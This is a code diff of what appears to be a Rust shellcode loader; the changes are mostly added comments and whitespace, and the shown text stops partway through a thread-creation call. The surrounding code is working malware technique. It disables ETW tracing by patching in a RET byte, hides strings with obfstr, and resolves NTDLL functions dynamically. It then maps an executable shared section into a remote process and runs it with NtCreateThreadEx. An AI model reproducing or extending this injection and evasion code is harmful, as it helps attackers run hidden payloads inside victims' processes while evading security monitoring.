@@ -3,7 +3,6 @@
 
 mod types;
 use types::*;
-use std::net::IpAddr;
 use obfstr::obfstr;
 use std::ptr::null_mut;
 use std::{env, ffi::c_void, mem};
@@ -23,24 +22,28 @@ struct ApiResolver {
     exports: ExportList<'static>,
 }
 
+// An api helper that wraps dynamic exports to make things easier
 impl ApiResolver {
     fn new() -> Self { ApiResolver {
             exports: ExportList::new(),
         }
     }
 
+    // Get reference to the export from NTDLL/KERNEL32
     fn get_addr(&mut self, dll: &'static str, func: &'static str) -> usize {
         self.exports.add(dll, func)
             .unwrap_or_else(|_| 
-                panic!("{}{}{}", obfstr!("Couldn't add"), dll, func));
+                panic!("{}{}{}", obfstr!(" Couldn't add "), dll, func));
 
+        // Retrieve the virtual adress of the function
         let addr = self.exports.get_function_address(func)
             .unwrap_or_else(|_|
-                 panic!("{}{}{}", obfstr!("No adress for"), dll, func));
+                 panic!("{}{}{}", obfstr!(" No adress for "), dll, func));
         
         return addr as usize
     }
 }
+
 
 unsafe fn patch_etw() {
     let mut api = ApiResolver::new();
@@ -48,7 +51,7 @@ unsafe fn patch_etw() {
     let writeProcMem = api.get_addr(&KERNEL32_DLL, &WRITEPROC);
     let writeProcMem: WriteProcessMemoryFn = mem::transmute(writeProcMem);
 
-    let patch = [0xC3u8];
+    let patch = [0xC3u8];  // x86 RET opcode
     let written = 0 as *mut usize;
 
     let result = writeProcMem(
@@ -104,9 +107,10 @@ unsafe fn create_section(cipher: Vec<u8>) -> (HANDLE, usize, Vec<u8>) {
     let ntCreateSection: NtCreateSectionFn = mem::transmute(ntCreateSection);
     let mut section = HANDLE(null_mut());
 
+    //Create local section RWX
     let status = ntCreateSection(
         &mut section,
-        0x0004 | 0x0002 | 0x0008, 
+        0x0004 | 0x0002 | 0x0008,    
         null_mut(),
         &mut max_size,
         PAGE_EXECUTE_READWRITE.0,
@@ -114,6 +118,7 @@ unsafe fn create_section(cipher: Vec<u8>) -> (HANDLE, usize, Vec<u8>) {
         HANDLE(null_mut()),
     );
     drop(api);
+    
     if status < 0 {
         panic!("{}{}", obfstr!("[-] NtCreateSection failed: "), GetLastError().0);
     }
@@ -131,6 +136,7 @@ unsafe fn map_sections(process_handle: HANDLE, section_handle: HANDLE, mut max_s
     let mut local_base: *mut c_void = null_mut();
     let mut remote_base: *mut c_void = null_mut();
 
+    //Map local (RW)
     let status = ntMapView(
         section_handle,
         GetCurrentProcess(),
@@ -149,7 +155,7 @@ unsafe fn map_sections(process_handle: HANDLE, section_handle: HANDLE, mut max_s
     }
     println!("{}{:?}", obfstr!("[+] Mapped local section at -> "), &local_base);
 
-    // 4) Map remote (RX)
+    //Map remote (RX)
     let status = ntMapView(
         section_handle,
         process_handle,
@@ -180,7 +186,7 @@ unsafe fn inject_and_exec(process_handle: HANDLE, local_base: *mut c_void, remot
     let mut api = ApiResolver::new();
     let ntUnmapView = api.get_addr(&NTDLL_DLL, &NTUNMAPVIEW);
     let ntUnmapView: NtUnmapViewOfSectionFn = mem::transmute(ntUnmapView);
-    ntUnmapView(GetCurrentProcess(), local_base);
+    ntUnmapView(GetCurrentProcess(), local_base);       //Unmap local view before creating thread
     drop(api);
 
     let base_ptr: *const c_void = remote_base as *const c_void;
@@ -190,6 +196,7 @@ unsafe fn inject_and_exec(process_handle: HANDLE, local_base: *mut c_void, remot
     let ntCreateThread = api.get_addr(&NTDLL_DLL, &NTCREATETHREAD);
     let ntCreateThread: NtCreateThreadExFn = mem::transmute(ntCreateThread);
 
+    //Create remote thread
     let mut h_thread = HANDLE::default();
     let status = ntCreateThread(
         &mut h_thread,                
